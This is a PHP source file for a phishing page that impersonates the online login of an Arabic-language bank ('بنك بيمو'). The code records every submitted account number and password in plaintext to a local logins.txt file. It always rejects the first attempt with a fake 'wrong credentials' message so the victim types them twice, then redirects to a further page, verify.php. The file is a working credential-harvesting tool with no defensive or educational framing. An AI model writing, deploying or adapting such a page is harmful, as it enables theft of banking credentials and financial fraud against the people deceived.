<?php
// مسار الملف لتخزين بيانات تسجيل الدخول
$file = "logins.txt";

// بدء الجلسة لتتبع المحاولات
session_start();

// إذا لم يتم تسجيل عدد المحاولات، يتم ضبطه على 0
if (!isset($_SESSION['attempt'])) {
    $_SESSION['attempt'] = 0;
}

// إذا تم إرسال بيانات تسجيل الدخول
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = trim($_POST['username']);
    $password = trim($_POST['password']);

    // تخزين بيانات المحاولة في الملف
    $data = "Attempt " . ($_SESSION['attempt'] + 1) . " - Username: $username | Password: $password\n";
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    // إذا كانت هذه المحاولة الثانية، يتم السماح بالدخول
    if ($_SESSION['attempt'] >= 1) {
        $_SESSION['attempt'] = 0; // إعادة تعيين العداد بعد النجاح
        header("Location: verify.php");
        exit();
    } else {
        $_SESSION['attempt']++; // زيادة عدد المحاولات
        $error = "رقم الحساب أو كلمة المرور غير صحيحة. حاول مرة أخرى.";
    }
}
?>

<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - بنك بيمو</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f5f5f5; text-align: center; }
        .container { width: 300px; margin: 100px auto; padding: 20px; background: white; border-radius: 5px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
        h2 { color: #003366; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { background-color: #003366; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
        button:hover { background-color: #002244; }
        .error { color: red; margin-bottom: 10px; }
    </style>
</head>
<body>

<div class="container">
    <h2>اهلا بك في بنك بيمو الالكتروني</h2>
    <?php if (isset($error)) { echo "<p class='error'>$error</p>"; } ?>
    <form method="post">
        <input type="text" name="username" placeholder="رقم الحساب" required>
        <input type="password" name="password" placeholder="كلمة المرور" required>
        <button type="submit">تسجيل الدخول</button>
    </form>
</div>

</body>
</html>